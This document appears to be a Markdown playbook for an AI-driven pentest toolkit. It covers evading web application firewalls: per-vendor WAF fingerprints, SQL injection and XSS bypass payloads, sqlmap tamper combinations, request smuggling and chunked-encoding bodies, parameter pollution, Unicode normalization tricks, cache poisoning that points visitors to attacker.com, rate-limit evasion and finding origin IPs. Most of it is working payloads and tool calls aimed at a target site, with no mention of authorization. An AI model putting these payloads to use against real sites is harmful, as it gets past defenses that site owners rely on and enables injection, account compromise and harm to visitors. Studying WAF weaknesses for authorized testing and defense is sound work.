# TTP: WAF Evasion Techniques

Techniques for bypassing Web Application Firewalls mapped to HexStrike
tools. Covers per-WAF bypass tables, encoding tricks, HTTP smuggling,
chunked transfer abuse, and sqlmap tamper script selection.

**MITRE ATT&CK**: T1562.001 (Impair Defenses: Disable or Modify Tools)

---

## Quick Decision Tree

```
# Step 1: Identify the WAF
wafw00f_scan(target="https://target.com")
→ Returns: WAF vendor and confidence level

# Step 2: Look up bypass techniques in tables below

# Step 3: Configure tools with appropriate evasion
sqlmap_scan(target=<url>, tamper=<tamper_for_waf>)
dalfox_xss_scan(target=<url>) # has built-in WAF bypass
nuclei_scan(target=<url>) # template-based, less likely blocked
```

---

## 1. WAF Detection

### 1a. Automated Detection

```
wafw00f_scan(target="https://target.com")
→ Identifies WAF by:
  - Response headers (Server, X-Powered-By, custom headers)
  - Cookie names (e.g., __cfduid for Cloudflare)
  - Response body patterns on blocked requests
  - Behavioral analysis (what triggers blocks)
```

### 1b. Manual Detection Indicators

```
# Send a clearly malicious request:
http_repeater(url="https://target.com/search",
              params={"q": "<script>alert(1)</script>"})

# Check response for WAF signatures:
```

| WAF | Detection Signatures |
|-----|---------------------|
| Cloudflare | Header: `cf-ray`, `cf-cache-status`. Cookie: `__cfduid`. Error page: "Attention Required! Cloudflare" |
| AWS WAF | Header: `x-amzn-RequestId`. 403 with generic "Request blocked" |
| ModSecurity | Header: `Server: Apache/2.x (mod_security)`. Error: "ModSecurity Action" |
| Imperva/Incapsula | Cookie: `visid_incap_*`, `incap_ses_*`. Header: `X-CDN: Imperva` |
| Akamai | Header: `X-Akamai-Transformed`. Reference ID in error pages |
| F5 BIG-IP ASM | Cookie: `BIGipServer*`, `TS*`. Header: `X-WA-Info` |
| Sucuri | Header: `X-Sucuri-ID`. Error: "Access Denied - Sucuri Website Firewall" |
| Barracuda | Cookie: `barra_counter_session`. Error: "Barracuda Web Application Firewall" |
| Fortinet FortiWeb | Cookie: `FORTIWAFSID`. Error page with FortiWeb branding |
| Citrix NetScaler | Header: `Via: NS-CACHE`. Cookie: `ns_af`, `citrix_ns_id` |

---

## 2. Per-WAF Bypass Techniques

### 2a. Cloudflare

```
# Cloudflare blocks common attack patterns but has known bypasses:

# SQLi bypass:
sqlmap_scan(target=<url>,
            tamper="charunicodeescape,space2comment",
            random_agent=True,
            delay=2)

# XSS bypasses:
# Standard <script> blocked, use event handlers:
<details open ontoggle=alert(1)>
<svg/onload=alert(1)>
<img src=x onerror=alert`1`>

# Cloudflare-specific SQLi bypasses:
# Unicode normalization: ＇ (fullwidth apostrophe U+FF07)
# Comment injection: /*!50000 UNION*/ SELECT
# Double URL encoding: %2527 instead of %27

# Finding origin IP (bypass CDN entirely):
# Check: DNS history, Shodan historical data
# Check: email headers from target (reveals origin IP)
# Check: censys_certificate_search for direct IP certs
censys_search_hosts(query="services.tls.certificates.leaf.names: target.com AND NOT services.banner: cloudflare")
```

### 2b. AWS WAF

```
# AWS WAF uses rule groups — bypass depends on which rules are active

sqlmap_scan(target=<url>,
            tamper="randomcase,percentage,space2mssqlblank",
            random_agent=True)

# Common AWS WAF bypasses:
# Case randomization: SeLeCt instead of SELECT
# Null bytes: %00 injection between keywords
# Comment injection: SEL/**/ECT
# Double encoding: %2553%2545%254c%2545%2543%2554

# XSS bypasses for AWS WAF:
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
<svg onload=eval(atob('YWxlcnQoMSk='))>
```

### 2c. ModSecurity (OWASP CRS)

```
# ModSecurity CRS uses paranoia levels (PL1-PL4)
# PL1 (default) is the most common

sqlmap_scan(target=<url>,
            tamper="space2comment,between,charencode",
            random_agent=True)

# PL1 bypasses:
# Inline comments: UN/**/ION SE/**/LECT
# Between operator: 1 AND 1 BETWEEN 0 AND 2
# Case mixing: uNiOn SeLeCt
# Concat alternative: CONCAT_WS(0x3a,user(),version())

# PL2+ bypasses (harder):
# Mathematical expressions: 1+1 instead of 2
# Hex encoding: 0x756e696f6e (hex of "union")
# Char function: CHAR(117,110,105,111,110)

# XSS bypasses:
# SVG without standard tags: <svg/onload=alert(1)>
# Data URI: <a href="data:text/html,<script>alert(1)</script>">click</a>
# JavaScript protocol: <a href="javascript:alert(1)">click</a>
```

### 2d. Imperva / Incapsula

```
sqlmap_scan(target=<url>,
            tamper="charencode,chardoubleencode,space2mssqlhash",
            random_agent=True,
            delay=3)

# Imperva bypasses:
# Double encoding: %2527 or %25%27
# Unicode: %u0027 (Unicode apostrophe)
# HPP (HTTP Parameter Pollution): &id=1&id=' UNION SELECT
# Multipart form: PUT SQLi in multipart boundary

# Imperva often blocks by:
# - Request rate (add delay)
# - Known tool user-agents (use --random-agent)
# - Pattern matching on payloads (use encoding)
```

### 2e. Akamai

```
sqlmap_scan(target=<url>,
            tamper="space2plus,randomcase,charunicodeencode",
            random_agent=True,
            delay=2)

# Akamai Kona bypasses:
# Plus sign for space: UNION+SELECT
# Tab instead of space: UNION%09SELECT
# Newline injection: UNION%0aSELECT
# Scientific notation: 1e0UNION SELECT

# XSS bypasses:
# Onpointerrawupdate (less common event):
<div onpointerrawupdate=alert(1)>test</div>
# Details/summary toggle:
<details open ontoggle=alert(1)>
```

### 2f. F5 BIG-IP ASM

```
sqlmap_scan(target=<url>,
            tamper="space2mssqlblank,percentage,charencode",
            random_agent=True)

# F5 ASM bypasses:
# Whitespace alternatives: %09 (tab), %0a (newline), %0d (CR)
# Comment nesting: /*/**/UNION/**/SELECT/**/
# String concatenation: 'un'||'ion'
```

---

## 3. Universal Evasion Techniques

### 3a. Encoding Bypasses

```
# URL encoding
' → %27
< → %3c
> → %3e
" → %22

# Double URL encoding
' → %2527
< → %253c

# Unicode encoding
' → %u0027
< → %u003c

# HTML entity encoding (for XSS)
< → &lt; or &#60; or &#x3c;
> → &gt; or &#62; or &#x3e;
" → &quot; or &#34;
' → &#39; or &#x27;

# JavaScript encoding (for XSS within JS contexts)
alert(1) → \u0061\u006c\u0065\u0072\u0074(1)
alert(1) → eval(atob('YWxlcnQoMSk='))
alert(1) → eval(String.fromCharCode(97,108,101,114,116,40,49,41))

# SQL encoding alternatives
UNION → UN/**/ION → %55%4e%49%4f%4e → CHAR(85,78,73,79,78)
SELECT → SE/**/LECT → %53%45%4c%45%43%54
```

### 3b. HTTP Method Manipulation

```
# Some WAFs only inspect GET/POST — try other methods:
http_method_scanner(url="https://target.com/api/endpoint")

# Methods to test:
# PUT, PATCH, DELETE, OPTIONS, HEAD
# X-HTTP-Method-Override: PUT (header-based method override)
# X-Method-Override: PUT

http_repeater(url="https://target.com/api/endpoint",
              method="PUT",
              body=<payload>,
              headers={"Content-Type": "application/json"})
```

### 3c. Content-Type Manipulation

```
# WAFs may only inspect specific Content-Types:

# Instead of application/x-www-form-urlencoded:
http_repeater(url="https://target.com/api",
              method="POST",
              body=<payload>,
              headers={"Content-Type": "application/json"})

# Or multipart:
http_repeater(url="https://target.com/api",
              method="POST",
              body=<multipart_payload>,
              headers={"Content-Type": "multipart/form-data; boundary=---"})

# Or XML:
http_repeater(url="https://target.com/api",
              method="POST",
              body="<root><param>'+OR+1=1--</param></root>",
              headers={"Content-Type": "text/xml"})
```

### 3d. HTTP Parameter Pollution (HPP)

```
# Send the same parameter multiple times:
http_parameter_pollution(url="https://target.com/search",
                         params={"q": ["normal", "' UNION SELECT 1,2,3--"]})

# Different servers handle duplicates differently:
# Apache (PHP): uses LAST occurrence
# IIS (ASP): concatenates with comma
# Tomcat: uses FIRST occurrence
# WAF may only inspect FIRST occurrence → second bypasses

# URL: /search?q=normal&q=' UNION SELECT 1,2,3--
# WAF sees: q=normal (safe)
# PHP sees: q=' UNION SELECT 1,2,3-- (malicious)
```

### 3e. Request Smuggling

```
http_smuggling_detect(target="https://target.com")
→ Tests for CL.TE and TE.CL smuggling vulnerabilities

# If smuggling works, payloads bypass WAF entirely:
# Front-end (WAF) processes headers differently than back-end
# Malicious request is "smuggled" past the WAF to the back-end

# CL.TE smuggling:
# Front-end uses Content-Length, back-end uses Transfer-Encoding
# WAF inspects the Content-Length portion (clean)
# Back-end processes the Transfer-Encoding portion (malicious)

# TE.CL smuggling:
# Front-end uses Transfer-Encoding, back-end uses Content-Length
# Similar principle, reversed
```

### 3f. Chunked Transfer Encoding

```
# Split payload across chunks:
http_repeater(url="https://target.com/search",
              method="POST",
              headers={"Transfer-Encoding": "chunked"},
              body="5\r\nq=te\r\n4\r\nst'\r\n0\r\n\r\n")

# WAF may not reassemble chunks before inspection
# Each chunk looks harmless individually
# Reassembled: q=test' (contains SQLi character)
```

---

## 4. sqlmap Tamper Script Reference

### Complete Tamper Mapping

| WAF | Recommended Tampers | Notes |
|-----|-------------------|-------|
| Cloudflare | `charunicodeescape,space2comment` | Add `--random-agent --delay 2` |
| AWS WAF | `randomcase,percentage,space2mssqlblank` | Add `--random-agent` |
| ModSecurity PL1 | `space2comment,between,charencode` | Works on default config |
| ModSecurity PL2+ | `space2comment,between,charencode,randomcase` | May need custom tamper |
| Imperva | `charencode,chardoubleencode,space2mssqlhash` | Add `--delay 3` |
| Akamai | `space2plus,randomcase,charunicodeencode` | Add `--delay 2` |
| F5 BIG-IP | `space2mssqlblank,percentage,charencode` | |
| Sucuri | `space2comment,charencode,randomcase` | |
| Barracuda | `space2plus,charencode` | |
| FortiWeb | `space2comment,randomcase,charencode` | |
| Generic/Unknown | `space2comment,randomcase,between` | Start here, iterate |

### Common Tamper Scripts Explained

```
# space2comment: Replaces spaces with inline comments
# SELECT 1 → SELECT/**/1

# randomcase: Randomizes character case
# SELECT → SeLeCt

# charencode: URL-encodes all characters
# SELECT → %53%45%4c%45%43%54

# chardoubleencode: Double URL-encodes
# ' → %2527

# charunicodeescape: Unicode escape
# ' → %u0027

# between: Replaces > with BETWEEN ... AND ...
# 1 AND 1>0 → 1 AND 1 BETWEEN 0 AND 2

# space2plus: Replaces spaces with +
# SELECT 1 → SELECT+1

# percentage: Adds % between characters (MSSQL)
# SELECT → S%E%L%E%C%T

# space2mssqlblank: Random MSSQL whitespace chars
# SELECT 1 → SELECT%091 (uses tab)

# equaltolike: Replaces = with LIKE
# WHERE id=1 → WHERE id LIKE 1
```

---

## 5. XSS WAF Bypass Payloads

### Progressively Advanced Payloads

```
# Level 1: Standard (blocked by most WAFs)
<script>alert(1)</script>
<img src=x onerror=alert(1)>

# Level 2: Event handler variations
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

# Level 3: Encoding
<img src=x onerror=alert`1`>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<svg onload=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>

# Level 4: Obfuscation
<img src=x onerror="window['al'+'ert'](1)">
<img src=x onerror="this['ownerDocument']['defaultView']['alert'](1)">
<svg onload="top[/al/.source+/ert/.source](1)">

# Level 5: DOM-based (bypass server-side WAF entirely)
# Inject via URL fragment (never sent to server):
https://target.com/page#<img src=x onerror=alert(1)>
# Only works if client-side JS processes location.hash

# Level 6: Mutation XSS (mXSS)
# Exploit browser HTML parser quirks:
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
```

---

## 6. Bypassing Rate Limiting

```
# If WAF blocks after N requests:

# Technique 1: Slow down
sqlmap_scan(target=<url>, delay=5, timeout=30)

# Technique 2: Rotate user agents
sqlmap_scan(target=<url>, random_agent=True)

# Technique 3: Rotate source IPs (if available)
# Use proxy chains, VPN rotation, or cloud functions

# Technique 4: Distribute across time
# Split scanning into shorter sessions with gaps

# Technique 5: Target origin IP directly (bypass CDN)
# If origin IP found via recon, send requests directly:
http_repeater(url="http://<origin_ip>/path",
              headers={"Host": "target.com"})
```

---

## 7. Modern WAF Bypass Techniques (2025–2026)

### 7a. Unicode Normalization Bypass (PortSwigger 2025 #4)

**Research: "Lost in Translation: Exploiting Unicode Normalization"**
When applications apply NFKC/NFKD normalization AFTER the WAF inspects,
visually distinct Unicode characters become attack-relevant ASCII.

```
# Fullwidth ASCII variants (U+FF01–U+FF5E):
＜ (U+FF1C) → <        ＞ (U+FF1E) → >
＇ (U+FF07) → '        ＂ (U+FF02) → "
／ (U+FF0F) → /        ＼ (U+FF3C) → \
（ (U+FF08) → (        ） (U+FF09) → )
＝ (U+FF1D) → =        ＊ (U+FF0A) → *
； (U+FF1B) → ;        ｜ (U+FF5C) → |

# XSS bypass:
＜script＞alert(1)＜／script＞
＜img src＝x onerror＝alert(1)＞

# SQLi bypass:
＇ OR 1＝1 －－
admin＇ ／＊＊／ OR ＇1＇＝＇1

# Path traversal bypass:
..／..／..／etc／passwd

# Other normalization families:
# Halfwidth Katakana → can normalize to ASCII in some contexts
# Combining characters: a + ̈ (combining diaeresis) may normalize
# Ligatures: ﬁ (U+FB01) → fi, ﬂ (U+FB02) → fl
# Superscripts: ¹²³ → 123

# Testing workflow:
http_repeater(url="https://target.com/search",
              params={"q": "\uff07 OR 1\uff1d1 \uff0d\uff0d"})
# WAF sees fullwidth chars → passes
# App normalizes → ' OR 1=1 --
```

### 7b. Parser Differential Attacks (WAFFLED Research 2025)

**Research: "WAFFLED: Exploiting Parsing Discrepancies to Bypass WAFs"**
Academic research tested major WAFs (Cloudflare, AWS, ModSecurity, Azure,
Google Cloud Armor) and found parsing differentials in all of them.

```
# Content-Type confusion — WAF and backend parse differently:

# Technique 1: JSON body with form Content-Type
http_repeater(url="https://target.com/api",
              method="POST",
              body='{"user":"admin\' OR 1=1--"}',
              headers={"Content-Type": "application/x-www-form-urlencoded"})
# WAF tries to parse as form → sees garbage → passes through
# Backend detects JSON → parses and executes SQLi

# Technique 2: Multipart boundary manipulation
# Use non-standard boundary characters WAF doesn't parse correctly:
http_repeater(url="https://target.com/upload",
              method="POST",
              headers={"Content-Type": "multipart/form-data; boundary=----=_"},
              body="------=_\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n' OR 1=1--\r\n------=_--")

# Technique 3: Chunked + Content-Length ambiguity
# Send both headers — WAF uses one, backend uses other:
http_repeater(url="https://target.com/api",
              method="POST",
              headers={
                "Content-Length": "6",
                "Transfer-Encoding": "chunked"
              },
              body="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n")

# Technique 4: Path normalization differential
http_repeater(url="https://target.com/static/../admin/users")
http_repeater(url="https://target.com/api/./../../admin")
http_repeater(url="https://target.com/api/%2e%2e/admin")
# WAF normalizes differently than the backend reverse proxy
```

### 7c. HTTP/2 Exploitation (PortSwigger 2025 #9)

```
# HTTP/2 introduces new bypass vectors:

# 1. HTTP/2 CONNECT method for SSRF/port scanning
# H2 CONNECT creates a tunnel — WAFs often don't inspect tunnel traffic
# Can be used to port-scan internal services through the reverse proxy

# 2. Pseudo-header injection
# HTTP/2 uses pseudo-headers (:method, :path, :authority)
# Some proxies translate H2→H1 and may inject CRLF:
# :path value of "/api\r\nX-Injected: true" → header injection

# 3. Header name case sensitivity
# HTTP/2 requires lowercase header names
# But some backends are case-insensitive
# Send: transfer-encoding: chunked (H2 lowercase)
# Backend may treat it differently than Transfer-Encoding

# 4. HTTP/2 request smuggling (H2.CL / H2.TE)
# Front-end uses H2, backend uses H1
# Desync between H2 framing and H1 parsing

# Detection:
http_smuggling_detect(target="https://target.com")
→ Tests for H2.CL and H2.TE desync vulnerabilities
```

### 7d. Next.js / Framework Cache Poisoning (2025 #7)

```
# Internal cache poisoning in modern frameworks
# Next.js, Nuxt.js, and similar SSR frameworks cache rendered pages
# Poisoning the cache affects ALL users who hit that page

# Next.js cache key confusion:
# Cache key includes path but may exclude certain headers/params
# Inject malicious content that gets cached for the clean URL

http_repeater(url="https://target.com/page",
              headers={"X-Forwarded-Host": "attacker.com"})
# If cached: all visitors now see content pointing to attacker.com
# Enables: phishing, XSS delivery to all visitors, SEO poisoning

# Detection:
# Add cache-busting param → observe if response is cached
# Compare responses with/without manipulation headers
# Check: X-Cache, Age, CF-Cache-Status headers in response
```

### 7e. AI-Powered WAF Bypass (2025+)

```
# Modern WAFs increasingly use ML models for detection
# Bypass strategies for AI/ML-based WAFs:

# 1. Adversarial payload generation
# Small perturbations that fool the ML model:
# Add random comments/whitespace that change the ML features
# but preserve the SQL/XSS semantics

# 2. Polymorphic payloads
# Generate semantically equivalent payloads that look different:
# UNION SELECT → UNION ALL SELECT
# 1=1 → 1<2 → 1!=2 → NOT 0
# alert(1) → alert`1` → alert.call(null,1) → [].find(alert)

# 3. Slow-burn evasion
# ML models often score request risk
# Split attack across multiple requests to stay below threshold
# Session-based attacks where no single request is malicious

# HexStrike AI payload generation:
advanced_payload_generation(
    attack_type="sqli",
    target_waf="cloudflare",
    evasion_level="high")
→ Generates WAF-aware payloads using AI
```

---

## Evasion Strategy Workflow

```
Step 1: Detect WAF
  wafw00f_scan(target="https://target.com")

Step 2: Test baseline
  http_repeater with clean request → 200 OK
  http_repeater with basic SQLi (') → blocked? → WAF confirmed

Step 3: Select evasion technique
  Look up WAF in tables above
  Start with recommended tamper scripts

Step 4: Test evasion
  sqlmap_scan with tamper scripts
  IF still blocked → try next tamper combination
  IF all tampers fail → try encoding bypass
  IF encoding fails → try HPP or method manipulation
  IF all fail → try finding origin IP to bypass CDN/WAF entirely

Step 5: Document what works
  add_scan_learning(target="target.com",
                    learning="Cloudflare WAF bypassed with charunicodeescape + delay 3")
```
